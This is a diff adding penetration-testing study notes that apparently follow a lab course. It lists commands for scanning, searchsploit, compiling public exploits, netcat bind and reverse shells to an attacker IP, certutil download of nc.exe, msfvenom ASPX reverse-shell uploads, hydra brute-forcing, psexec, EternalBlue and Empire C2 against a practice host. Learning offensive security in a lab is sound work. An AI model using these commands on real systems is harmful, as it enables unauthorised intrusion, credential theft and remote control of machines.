@@ -758,5 +758,263 @@ ssh -i ssh_key root@ipaddress
 ### Armitage
 run armitage in metasploit, easy pesay.
 
+# Exploitation
+PTES Penetration Testing Execution Standard
+
+### Vulnerability Scanning Overview
+**Banner Grabbing**
+```
+nmap -sV --script=banner 1.1.1.1
+nc 1.1.1.1 22
+searchsploit openssh 7.2
+ssh root@1.1.1.1
+```
+
+**Vulnerability scanning with nmap scripts**
+```
+ls -al /usr/share/nmap/scripts/ | grep shellshock
+nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 1.1.1.1
+```
+
+**Vulnerability scanning with Metasploit**
+```
+searchsploit EternalBlue
+searchsploit ms17-010
+
+search eternalblue
+```
+
+### Exploits
+**Searching for publicly available exploits**
+Legitimate exploit databases: exploit-db and rapid7.
+
+**Searching for exploits with SearchSploit**
+```
+ls -al /usr/share/exploitdb
+searchsploit --update
+
+searchsploit -m 49757 (copy to working directory)
+searchsploit -c OpenSSH (case sensitive)
+-t (title)
+-e (exact)
+searchsploit remote windows smb
+searchsploit remote webapps wordpress
+-w (get web links instead of local)
+```
+
+**Fixing exploits**
+```
+searchsploit HTTP File Server 2.3
+searchsploit -m 39161
+nano 39161.py
+python 39161.py targetip targetport
+> change ip address and port etc.
+> open different tabs
+python -m SimpleHTTPServer 80
+nc -nvlp 1234
+```
+
+**Cross-compiling exploits**
+```
+sudo apt-get install mingw-w64
+sudo apt-get install gcc
+searchsploit VideoLAN VLC SMB
+searchsploit -m 9303
+i686-w64-mingw32-gcc 9303.c -o exploit
+i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
+
+searchsploit Dirty Cow
+searchsploit -m 40839
+gcc -pthread 40839.c -o exploit -lcrypt
+```
+
+### Shells
+**Netcat fundamentals**
+Has client mode and server mode. 
+```
+nc -nv 1.1.1.1 80
+nc -nvu 1.1.1.1 139
+
+cd /usr/share/windows-binaries/
+python -m SimpleHTTPServer 80
+
+>on windows
+certutil -urlcache -f http://host-ip/nc.exe nc.exe
+
+nc -nvlp 1234
+nc.exe -nv hostip 1234
+
+nc.exe -nvlp 1234 > test.txt
+nc -nv 1.1.1.1 1234 < test.txt
+```
+
+**Bind shells**
+A type of remote shells when attacker connects directly to listener, allows for execution of commands on target system.
+Problematic, needs to set up netcat listener and firewall may block incoming traffic.
+```
+nc.exe -nvlp 1234 -e cmd.exe
+nc -nv 1.1.1.1 1234
+
+nc -nvlp 1234 -c /bin/bash
+nc.exe -nv targetip 1234
+```
+
+**Reverse shells**
+Get target to connect directly to listener on attacker's system allowing for execution of commands on the target system. Does not need to be connected via netcat. Less chance of firewall on outgoing traffic. Can leak attacker's IP. 
+```
+nc -nvlp 1234
+nc.exe -nv attackerip 1234 -e cmd.exe
+```
+
+**Reverse shell cheatsheet**
+Github swisskyrepo/PayloadsAllTheThings.
+Reverse Shell Generator revshells.com
+
+### Frameworks
+**The Metasploit Framework (MSF)**
+Google default credentials for target system.
+Find system information and versions.
+```
+searchsploit ProcessMaker
+```
+
+**PowerShell-Empire**
+Empire mostly for exploitation and post-exploitation on Windows targets.
+More for C&C for Windows targets. Some modules for Mac OS.
+Starkiller is a GUI frontend for Empire. Create stagers etc.
+```
+sudo apt-get update && sudo apt-get install powershell-empire starkiller -y
+
+sudo powershell-empire server
+sudo powershell-empire client
+listeners
+agents
+interact Windows7
+```
+
+### Windows exploitation
+#### Windows Black Box Penetration Test
+**Port scanning and enumeration - Windows**
+```
+cat /etc/hosts
+mkdir Win2k8
+ping 1.1.1.1
+nmap -T4 -PA -sC -sV -p 1-10000 1.1.1.1 -oX nmap_10k
+nmap -T4 -PA -sC -sV -p 1-65535 1.1.1.1 -oX nmap_all
+nmap -T4 -PA -sC -sV -sU -p 1-65535 1.1.1.1 -oX nmap_udp
+> check out different services in browser and netcat
+
+nc -nv 1.1.1.1 21
+service postgresql start
+msfconsole
+workspace -a Win2k8
+db_import /root/Desktop/Win2k8/nmap_10k
+search smb_version
+use 0
+set RHOSTS 1.1.1.1
+run
+hosts
+```
+
+**Targeting Microsoft IIS FTP**
+Microsoft ftpd is intertwined with Microsoft IIS if both are found together.
+```
+nmap -sV -sC -p21,80 1.1.1.1
+nmap -sV -p 21 --script=ftp-anon 1.1.1.1
+ftp 1.1.1.1 21
+
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P .../unix_passwords.txt 1.1.1.1 ftp
+hydra -l vagrant -P .../unix_users.txt 1.1.1.1 ftp
+
+msfvenom -p windows/shell/reverse_tcp LHOST=hostip LPORT=1234 -f asp > shell.aspx
+>login with ftp
+put shell.aspx
+
+msfconsole
+use multi/handler
+set payload windows/shell/reverse_tcp
+set LPORT 1234
+run
+> go to the shell.aspx in browser
+> this probably does not work
+get index.html
+```
+
+**Targeting OpenSSH**
+```
+nmap -sV -sC -p 22 1.1.1.1
+searchsploit OpenSSH 7.1
+> no modules for this version
+hydra -l vagrant -P ../unix_users.txt 1.1.1.1 ssh
+ssh vagrant@targetip
+
+msfconsole
+search ssh login
+use 0
+```
+
+**Targeting SMB**
+```
+hydra -l administrator -P .../unix_users.txt 1.1.1.1 smb
+-l vagrant
+smbclient -L 1.1.1.1 -U vagrant
+smbmap -u vagrant -p vagrant -H 1.1.1.1
+enum4linux -u vagrant -p vagrant 1.1.1.1
+
+search smb_enumusers
+
+locate psexec.py
+chmod +x psexec.py
+python3 psexec.py Administrator@1.1.1.1
+
+search exploit/windows/smb/psexec
+set payload windows/x64/meterpreter....
+
+search eternalblue
+> no need for credentials
+```
+
+**Targeting MySQL Database Server**
+```
+searchsploit MySQL 5.5
+
+search mysql_login
+set PASS_FILE .../unix_passwords.txt
+
+mysql -u root -p -h 1.1.1.1
+show databases;
+>check WAMP server in browser
+
+search eternalblue
+cd /
+cd wamp\\
+cd www\\
+cd wp-config\\
+cd alias\\
+download phpmyadmin.conf
+> nano and delete rules, Allow from All
+
+upload phpmyadmin.conf
+shell
+net stop wampapache
+net start wampapache
+> go to phpmyadmin in browser
+> change admin password
+> go to /wordpress/wp-admin
+```
+
+### Linux
+#### Linux Black Box Penetration Test
+**Port scanning & enumeration - Linux**
+```
+nmap -sV -p1-10000 1.1.1.1 -oN nmap_10k.txt
+nc -nv 1.1.1.1 512
+nc -nv 1.1.1.1 513
+> manual banner grabbing on different ports...
+cat /etc/*release
+> check ports in browser
+```
+
+**Targeting vsFTPd**
 
 
